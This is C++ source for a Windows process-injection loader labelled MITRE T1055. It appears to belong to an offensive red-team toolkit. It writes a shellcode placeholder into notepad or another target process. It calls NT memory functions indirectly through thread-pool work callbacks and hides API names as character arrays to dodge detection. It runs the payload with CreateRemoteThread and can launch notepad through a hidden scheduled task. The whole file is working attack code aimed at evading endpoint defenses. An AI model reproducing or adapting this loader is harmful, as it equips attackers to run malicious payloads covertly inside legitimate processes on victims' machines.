/**
Editor: Thomas X Meng
T1055 Process Injection
Custom Stack PI (remote) with decoy code 
**/
/***

*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
// For the scheduler: 
#include <mstask.h>
#include <tlhelp32.h>
#include <time.h>
#pragma comment (lib, "ole32")
#pragma comment(lib, "uuid")
//

wchar_t* get_filename_from_path(wchar_t *path) {
    wchar_t *filename = wcsrchr(path, L'\\');
    return filename ? filename + 1 : path;
}
int create_and_run_task(const char *program_path) {
    wchar_t program_to_execute[256];
    mbstowcs(program_to_execute, program_path, strlen(program_path) + 1);
    wprintf(L"Program to execute: %ls\n", program_to_execute);

    HRESULT hr = S_OK;
    ITaskScheduler *pITS;
    
    // initialize COM library
    hr = CoInitialize(NULL);

    printf("COM initialized.\n"); getchar();

    if (SUCCEEDED(hr)) {
        // get Task Scheduler object
        hr = CoCreateInstance(CLSID_CTaskScheduler,
                               NULL,
                               CLSCTX_INPROC_SERVER,
                               IID_ITaskScheduler,
                               (void **) &pITS);
        if (FAILED(hr)) {
            CoUninitialize();
            return 1;
        }
    } else {
        return 1;
    }

    printf("Task Scheduler object is up.\n"); getchar();

    // Generate a unique task name
    time_t now = time(NULL);
    wchar_t pwszTaskName[64];
    swprintf(pwszTaskName, sizeof(pwszTaskName) / sizeof(wchar_t), L"Project0_%lld", (long long)now);

    ITask *pITask;
    IPersistFile *pIPersistFile;

    // create new task
    hr = pITS->NewWorkItem(pwszTaskName,        // Name of task
                         CLSID_CTask,           // Class identifier 
                         IID_ITask,             // Interface identifier
                         (IUnknown**) &pITask); // Address of task 
    if (FAILED(hr)) {
        CoUninitialize();
        printf("Failed calling NewWorkItem, error = 0x%x\n", hr);
        return 1;
    }

    // set task parameters: comment, name, working directory, params
    pITask->SetComment(L"Let's execute some legit software");
    pITask->SetApplicationName(program_to_execute);
    pITask->SetWorkingDirectory(L"C:\\Windows\\System32");

    // Set principal for highest privileges
    hr = pITask->SetAccountInformation(L"", NULL); // Run with the default account

    // set Flags
    pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON | TASK_FLAG_HIDDEN);  // hidden flag set on .job file

    // get a pointer to IPersistFile
    hr = pITask->QueryInterface(IID_IPersistFile,
                              (void **) &pIPersistFile);

    if (FAILED(hr)) {
        CoUninitialize();
        printf("Failed calling QueryInterface, error = 0x%x\n", hr);
        return 1;
    }

    // save the new task to disk
    hr = pIPersistFile->Save(NULL, TRUE);
    pIPersistFile->Release();
    
    if (FAILED(hr)) {
        CoUninitialize();
        printf("Failed calling Save, error = 0x%x\n", hr);
        return 1;
    }

    printf("Created task.\n");
    // Sleep for 2 seconds:
    Sleep(2000);

    // run the task
    hr = pITask->Run();
    pITask->Release();

    if (FAILED(hr)) {
        printf("Failed calling ITask::Run, error = 0x%x\n", hr);
        CoUninitialize();
        return 1;
    }  
    printf("Task ran.\n");

    printf("Check C:\\Windows\\Tasks folder\n"); getchar();

    // and remove the task
    pITS->Delete(pwszTaskName);
    pITS->Release();                               // Release object
    printf("Task removed\n");

    // clean up
    CoUninitialize();
    
    return 0;
}

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;


typedef NTSTATUS(NTAPI* myNtTestAlert)(
    VOID
);

typedef struct _NTTESTALERT_ARGS {
    UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
} NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;

typedef struct _NTQUEUEAPCTHREADEX_ARGS {
    UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
    HANDLE hThread;                         // HANDLE ThreadHandle - rcx
    HANDLE UserApcReserveHandle;            // HANDLE UserApcReserveHandle - rdx
    QUEUE_USER_APC_FLAGS QueueUserApcFlags; // QUEUE_USER_APC_FLAGS QueueUserApcFlags - r8
    PVOID ApcRoutine;                       // PVOID ApcRoutine - r9
    // PVOID SystemArgument1;                  // PVOID SystemArgument1 - stack pointer
    // PVOID SystemArgument2;                  // PVOID SystemArgument2 - stack pointer
    // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
} NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;

typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine
);


extern "C" {
    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}



BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

int main(int argc, char *argv[]) {


    unsigned char magiccode[] = ####SHELLCODE####;


    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer
    BOOL ppidFlag = FALSE;        // Flag to check -ppid argument


    //In case user supplied argument -h, print help message
    if (argc == 2 && strcmp(argv[1], "-h") == 0) {
        printf("Usage: %s [-pid <pid>] [-ppid]\n", argv[0]);
        printf("Options:\n");
        printf("  -pid <pid>  Specify the PID of the target process\n");
        printf("  -ppid       Create a scheduled task to execute the loader\n");
        return 0;
    } else if (argc == 3 && strcmp(argv[1], "-pid") == 0) {
        pid = atoi(argv[2]);
        printf("[+] PID provided: %d\n", pid);
        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
        if (pi.hProcess == NULL || pi.hThread == NULL) {
            printf("[-] Failed to open process or thread.\n");
        }
    } else if (argc == 2 && strcmp(argv[1], "-ppid") == 0) {
        printf("[+] -ppid flag detected\n");
        ppidFlag = TRUE;
        // Determine the correct Notepad path based on system architecture
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }
        create_and_run_task(notepadPath);
        wchar_t wNotepadPath[256] = {0}; // Buffer for wide-character path
        MultiByteToWideChar(CP_ACP, 0, notepadPath, -1, wNotepadPath, 256);
        wchar_t *executable_name = get_filename_from_path(wNotepadPath);
        PROCESSENTRY32 pe32;
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            CoUninitialize();
            return 1;
        }
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hProcessSnap, &pe32)) {
            do {
                wchar_t exeFileNameW[MAX_PATH]; // Added this line
                MultiByteToWideChar(CP_ACP, 0, pe32.szExeFile, -1, exeFileNameW, MAX_PATH); // Added this line
                if (wcscmp(exeFileNameW, executable_name) == 0) { // Modified this line
                    pid = pe32.th32ProcessID;
                    break; 
                }
            } while (Process32Next(hProcessSnap, &pe32));
        }
        printf("PID of the process: %d\n", pid);
        CloseHandle(hProcessSnap);
    } else {
        printf("[-] PID not provided\n");
        // Determine the correct Notepad path based on system architecture
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }
        // Attempt to create a process with Notepad
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1; // Exit if unable to start Notepad
        }
        printf("Notepad started with default settings.\n");
        pid = pi.dwProcessId;  
        printf("[+] notepad PID: %d\n", pid);      
    } 

    printf("[+] PID: %d\n", pid);


    // LPVOID allocatedAddress = NULL;
    PVOID allocatedAddress = NULL;

    SIZE_T allocatedsize = sizeof(magiccode);

    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[sizeof(magiccode) - 8], magiccode[sizeof(magiccode) - 7], magiccode[sizeof(magiccode) - 6], magiccode[sizeof(magiccode) - 5], magiccode[sizeof(magiccode) - 4], magiccode[sizeof(magiccode) - 3], magiccode[sizeof(magiccode) - 2], magiccode[sizeof(magiccode) - 1]);
    

	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtAllocateFuture);
    ntAllocateVirtualMemoryArgs.hProcess = pi.hProcess;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), "TpAllocWork");
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), "TpReleaseWork");

    PTP_WORK WorkReturn = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    // getchar();

/// Write memory: 
    if(allocatedAddress == NULL) {
        // printf("[-] Failed to allocate memory\n");
        printf("allocatedAddress: %p\n", allocatedAddress);
    }
    printf("allocatedAddress: %p\n", allocatedAddress);
    if(allocatedsize != sizeof(magiccode)) {
        printf("[-] Allocated size is not the same as magiccode size\n");
        printf("[-] Allocated size: %lu\n", allocatedsize);
        printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
    }


	///Write process memory: 

    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), "NtWriteVirtualMemory");
    ntWriteVirtualMemoryArgs.hProcess = pi.hProcess;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
    ntWriteVirtualMemoryArgs.size = allocatedsize;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    printf("Bytes written: %lu\n", bytesWritten);



    //// Execution part (can be replaced with any other execution method): 

    // 1. Creating a remote thread in the target process to execute the magiccode
	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedAddress, NULL, 0, NULL);

    // // instead of create a remote thread point to the shellcode, it point to a random address:
    // hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)0x12345678, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed (%d).\n", GetLastError());
        return 0;
    } else {
        printf("[+] magiccode execution started\n");
    }


    // /// 2. Set workers to execute code, only works for local address, we may run a trampoline code to execute remote code: 
    // PTP_WORK WorkReturn4 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn4, (PTP_WORK_CALLBACK)allocatedAddress, NULL, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn4);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn4);


    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject(pi.hProcess, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }
/////////// 3. Use APC to execute code: 

    // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };

    // // NtQueueApcThreadEx_t pNtQueueApcThread = (NtQueueApcThreadEx_t)GetProcAddress(GetModuleHandleA(libName), NtQueueFutureApcEx2Str);

    // QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
    // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;

    // NTQUEUEAPCTHREADEX_ARGS ntQueueApcThreadExArgs = { 0 };
    // ntQueueApcThreadExArgs.pNtQueueApcThreadEx = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtQueueFutureApcEx2Str);
    // ntQueueApcThreadExArgs.hThread = GetCurrentThread();
    // ntQueueApcThreadExArgs.UserApcReserveHandle = NULL;
    // ntQueueApcThreadExArgs.QueueUserApcFlags = apcFlags;
    // ntQueueApcThreadExArgs.ApcRoutine = (PVOID)apcRoutine;


    // /// Set workers

    // const char NtTestFutureStr[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', 0 };
    // myNtTestAlert testAlert = (myNtTestAlert)GetProcAddress(GetModuleHandle(libName), NtTestFutureStr);
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine,  
    // //     (PVOID)0,  
    // //     (PVOID)0,  
    // //     (PVOID)0 
    // //     );
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine
    // //     );
    // PTP_WORK WorkReturn3 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)NtQueueApcThreadCustom, &ntQueueApcThreadExArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);
    // // QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
	// testAlert();

    SimpleSleep(15000000);
    getchar();
    //// Execution end..

    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}